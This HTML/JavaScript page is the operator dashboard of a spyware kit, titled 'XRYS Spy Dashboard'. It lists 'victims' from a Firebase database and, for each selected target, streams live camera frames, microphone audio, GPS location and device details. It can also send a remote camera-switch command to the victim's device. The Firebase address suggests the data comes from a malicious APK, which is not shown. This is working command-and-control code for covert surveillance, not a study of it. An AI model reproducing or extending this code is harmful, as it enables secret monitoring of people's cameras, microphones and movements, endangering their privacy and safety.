<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XRYS Spy Dashboard</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body class="bg-[#0f172a] text-white h-screen flex overflow-hidden font-sans">
    <div class="w-1/3 bg-gray-900 border-r border-gray-700 h-full overflow-y-auto">
        <div class="p-4 bg-gray-800 border-b border-gray-700 sticky top-0 z-10">
            <h1 class="text-xl font-bold text-red-500">🕵️ Active Targets</h1>
            <p class="text-xs text-gray-400 mt-1" id="onlineCount">0 Devices Connected</p>
        </div>
        <div id="victimList" class="divide-y divide-gray-800"></div>
    </div>

    <div class="flex-1 flex flex-col h-full relative">
        <div id="welcomeMsg" class="absolute inset-0 flex items-center justify-center text-gray-500 flex-col">
            <p>Select a target to view data</p>
        </div>

        <div id="spyPanel" class="hidden flex-1 p-6 flex flex-col gap-6 overflow-y-auto">
            <h2 class="text-2xl font-bold text-red-400 border-b border-gray-700 pb-2" id="spyTargetId">Target: #0000</h2>
            
            <div class="grid grid-cols-2 gap-6">
                <!-- Camera Feed -->
                <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 flex flex-col relative">
                    <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase">Live Camera Feed</h3>
                    <div class="flex-1 bg-black rounded overflow-hidden flex items-center justify-center relative min-h-[250px]">
                        <img id="spyCam" src="" class="w-full h-full object-cover hidden">
                        <p id="camWait" class="absolute text-gray-500 text-sm animate-pulse">Waiting for frame...</p>
                    </div>
                    <!-- Switch Camera Button -->
                    <button onclick="switchCamera()" class="absolute top-4 right-4 bg-gray-900/80 p-2 rounded-full hover:bg-red-600 transition">
                        🔄 Switch Cam
                    </button>
                </div>

                <!-- Location & Audio -->
                <div class="flex flex-col gap-4">
                    <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 flex-1">
                        <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase">Live Location</h3>
                        <p id="spyLocation" class="text-sm font-mono text-center mb-4">Unknown</p>
                        <a id="spyMapsBtn" href="#" target="_blank" class="block bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded-lg font-bold text-center">Open Maps</a>
                    </div>

                    <div class="bg-gray-800 rounded-xl p-4 border border-gray-700 flex-1">
                        <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase">Microphone</h3>
                        <audio id="spyAudio" controls autoplay class="w-full mt-4 hidden"></audio>
                        <p id="audioWait" class="text-xs text-gray-500 text-center mt-4">Waiting for audio stream...</p>
                    </div>
                </div>
            </div>

            <div class="bg-gray-800 rounded-xl p-4 border border-gray-700">
                <h3 class="text-sm font-bold text-gray-400 mb-2 uppercase">Device Info</h3>
                <p id="spyDevice" class="text-sm font-mono text-green-400 break-all"></p>
            </div>
        </div>
    </div>

    <script>
        const firebaseConfig = { databaseURL: "https://download-apks-adc2c-default-rtdb.firebaseio.com/" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let currentSelectedId = null;
        const victimList = document.getElementById('victimList');

        // Audio Player Logic
        let audioQueue = [];
        let isPlayingAudio = false;
        const spyAudio = document.getElementById('spyAudio');

        db.ref('victims').on('value', (snapshot) => {
            const data = snapshot.val();
            victimList.innerHTML = '';
            if(!data) return document.getElementById('onlineCount').innerText = "0 Devices Connected";

            const ids = Object.keys(data);
            document.getElementById('onlineCount').innerText = ids.length + " Devices Connected";

            ids.forEach(id => {
                const v = data[id];
                const div = document.createElement('div');
                div.className = `p-4 cursor-pointer hover:bg-gray-800 transition border-l-4 ${currentSelectedId === id ? 'border-red-500 bg-gray-800' : 'border-transparent'}`;
                div.onclick = () => selectVictim(id, v);
                
                div.innerHTML = `
                    <div class="flex justify-between items-center mb-1">
                        <h3 class="font-bold text-lg text-white">ID: ${id}</h3>
                        <span class="text-xs ${v.camStatus === 'Active' ? 'text-green-400' : 'text-red-400'}">${v.camStatus}</span>
                    </div>
                `;
                victimList.appendChild(div);
            });
        });

        function selectVictim(id, data) {
            currentSelectedId = id;
            document.getElementById('welcomeMsg').classList.add('hidden');
            document.getElementById('spyPanel').classList.remove('hidden');
            
            document.getElementById('spyTargetId').innerText = "Target: #" + id;
            document.getElementById('spyDevice').innerText = data.device;
            
            // Reset UI
            document.getElementById('spyCam').classList.add('hidden');
            document.getElementById('camWait').classList.remove('hidden');
            document.getElementById('spyAudio').classList.add('hidden');
            document.getElementById('audioWait').classList.remove('hidden');
            audioQueue = [];

            db.ref('victims/' + id).on('value', (snap) => {
                const v = snap.val();
                if(!v) return;
                
                // Camera
                if(v.latest_frame) {
                    document.getElementById('spyCam').src = v.latest_frame;
                    document.getElementById('spyCam').classList.remove('hidden');
                    document.getElementById('camWait').classList.add('hidden');
                }

                // Location
                if(v.location && v.location !== "Waiting...") {
                    document.getElementById('spyLocation').innerText = v.location;
                    if(v.mapsLink) document.getElementById('spyMapsBtn').href = v.mapsLink;
                }

                // Audio (Push to queue and play)
                if(v.latest_audio) {
                    document.getElementById('spyAudio').classList.remove('hidden');
                    document.getElementById('audioWait').classList.add('hidden');
                    
                    // Only play if it's a new chunk (prevent looping same chunk)
                    if(audioQueue[audioQueue.length - 1] !== v.latest_audio && !isPlayingAudio) {
                        audioQueue.push(v.latest_audio);
                        playNextAudio();
                    }
                }
            });
        }

        function playNextAudio() {
            if (audioQueue.length === 0) { isPlayingAudio = false; return; }
            isPlayingAudio = true;
            spyAudio.src = audioQueue.shift();
            spyAudio.play();
        }
        
        spyAudio.onended = () => {
            isPlayingAudio = false;
            playNextAudio();
        };

        function switchCamera() {
            if(currentSelectedId) {
                // Send command to victim to switch camera
                db.ref('victims/' + currentSelectedId + '/command').set('switch');
                alert("Command sent! Camera will switch in 1-2 seconds.");
            }
        }
    </script>
</body>
</html>
